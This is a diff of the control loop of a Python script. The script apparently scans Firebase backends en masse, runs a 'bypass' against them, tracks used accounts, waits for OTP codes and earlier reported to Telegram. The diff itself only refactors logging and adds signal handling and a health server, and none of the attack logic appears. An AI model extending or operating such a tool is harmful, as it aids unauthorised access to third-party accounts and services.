-    print(f"\n{C.info('📡 Scanning')} {C.BOLD}{len(urls)}{C.RESET} "
-          f"{C.info('firebase(s) in full speed...')}")
+    log(f"\n{C.info('📡 Scanning')} {C.BOLD}{len(urls)}{C.RESET} firebase(s)...")
     await scan_all_streaming(urls)
 
-    print(f"\n{C.ok('✅ Auto-selected ALL')} {C.BOLD}{len(urls)}{C.RESET} "
-          f"{C.info('firebase(s) — starting bypass...')}")
-    for i, u in enumerate(urls, 1):
-        print(f"   {C.YELLOW}{i:>3}.{C.RESET} {C.dev(u)}")
+    log(f"\n{C.ok('✅ Auto-selected ALL')} {C.BOLD}{len(urls)}{C.RESET} firebase(s)")
 
     await process_multiple_firebases(urls)
     return True
 
 
-def main():
-    print_banner()
+def _signal_handler(signum, frame):
+    log(C.warn(f"\n⚠️  Signal {signum} received — shutting down gracefully..."))
+    sys.exit(0)
 
-    print(f"\n{C.head('💾 Used Accounts Tracker')}")
-    print(f"   {C.dim('File:')} {USED_FILE}")
-    print(f"   {C.dim('Records:')} {C.BOLD}{USED.count()}{C.RESET}")
-    print(f"   {C.dim('Devices parallel per batch:')} {C.BOLD}{DEVICES_PARALLEL}{C.RESET}")
-    print(f"   {C.dim('Telegram mode:')} {C.BOLD}FILE + CAPTION{C.RESET}")
-    print(f"   {C.dim('Mode:')} {C.ok('AUTO — NO SELECTION')}")
+
+def main():
+    signal.signal(signal.SIGTERM, _signal_handler)
+    signal.signal(signal.SIGINT, _signal_handler)
+
+    start_health_server()
+
+    print_banner()
+    log(f"\n{C.head('💾 Used Accounts Tracker')}")
+    log(f"   {C.dim('File:')} {USED_FILE}")
+    log(f"   {C.dim('Records:')} {C.BOLD}{USED.count()}{C.RESET}")
+    log(f"   {C.dim('Devices parallel:')} {C.BOLD}{DEVICES_PARALLEL}{C.RESET}")
+    log(f"   {C.dim('OTP wait:')} {C.BOLD}{OTP_WAIT_SECONDS}s{C.RESET}")
+    log(f"   {C.dim('Health port:')} {C.BOLD}{HEALTH_PORT}{C.RESET}")
+    log(f"   {C.dim('Mode:')} {C.ok('AUTO — SEQUENTIAL PHONES')}")
 
     while True:
         try:
-            ok = asyncio.run(auto_run_once())
+            asyncio.run(auto_run_once())
         except KeyboardInterrupt:
-            print(C.warn("\n⚠️  Interrupted by user."))
+            log(C.warn("\n⚠️  Interrupted."))
             break
+        except SystemExit:
+            raise
         except Exception as e:
             logger.error(f"auto_run_once crashed: {e}")
-            ok = False
 
         if AUTO_RERUN_DELAY <= 0:
             break
 
-        print(f"\n{C.info(f'🔁 Sleeping {AUTO_RERUN_DELAY}s before next loop...')}")
+        log(f"\n{C.info(f'🔁 Sleeping {AUTO_RERUN_DELAY}s before next loop...')}")
         try:
             time.sleep(AUTO_RERUN_DELAY)
         except KeyboardInterrupt:
-            print(C.warn("\n👋 Exiting..."))
             break
 
 
 if __name__ == "__main__":
-    try:
-        main()
-    except KeyboardInterrupt:
-        print(C.warn("\n👋 Exiting..."))
+    main()
